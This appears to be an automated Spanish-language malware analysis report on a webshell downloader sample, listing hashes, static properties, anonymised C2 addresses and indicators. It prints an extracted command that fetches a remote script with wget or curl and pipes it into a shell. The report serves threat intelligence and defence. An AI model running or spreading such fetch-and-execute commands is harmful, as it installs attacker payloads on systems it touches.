# 🧬 Payload Analysis

`b36e1ab2b149ab3c9ff9d45e0ba3b9053ef84ae8a8942ad3cc30846a8ad0cac5`

## 📌 Resumen

Artefacto asociado a la familia **webshell** con evidencia suficiente para atribución. Comportamientos destacados: Descarga remota, Ejecución. Se identificó 1 comando observado o extraído. Se identificaron 6 indicadores técnicos. **C2 / infraestructura de control:**

- **Posible C2:** `217.60.195.XXX` — confianza Alto, evidencia hardcoded_in_payload
- **Posible C2:** `190.179.140.XXX` — confianza Alto, evidencia hardcoded_in_payload **Ficha malware:** [malware-like/oraculo/downloader/b36e1ab2b149ab3c9ff9d45e0ba3b9053ef84ae8a8942ad3cc30846a8ad0cac5.md](../../../../../malware-like/oraculo/downloader/b36e1ab2b149ab3c9ff9d45e0ba3b9053ef84ae8a8942ad3cc30846a8ad0cac5.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Familia:** `webshell`
- **Confianza de familia:** `Media`
- **Riesgo:** `Critical`

## 🗓️ Registro

- **Registrado:** `2026-08-09T20:05:52.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `b36e1ab2b149ab3c9ff9d45e0ba3b9053ef84ae8a8942ad3cc30846a8ad0cac5`
- **SHA1:** `7e8f583f896aca17bad7b578f6dd6a47a99319d0`
- **MD5:** `10f5bd59b7f54efe9b3b50cac74bfe2b`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with very long lines (324), with CRLF line terminators |
| Tamaño | 1.8 KiB |
| Entropía | 5.8 |
| Strings | 33 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with very long lines (324), with CRLF line terminators; iocs=6

## 🖥️ Comandos observados / extraídos

```text
(wget --no-check-certificate -qO- hxxps://217.60.195.XXX/sh || curl -sk hxxps://217.60.195.XXX/sh) | sh -s apache.selfre
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxps://217.60.195.XXX/sh | strings |
| url | hxxps://217.60.195.XXX/sh) | strings |
| ip | 190.179.140.XXX | static_analysis |
| ip | 217.60.195.XXX | static_analysis |
| command | (wget --no-check-certificate -qO- hxxps://217.60.195.XXX/sh \|\| curl -sk hxxps://217.60.195.XXX/sh) \| sh -s apache.selfre | strings |
| hash | b36e1ab2b149ab3c9ff9d45e0ba3b9053ef84ae8a8942ad3cc30846a8ad0cac5 | static_analysis |
| ip | 118.70.178.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
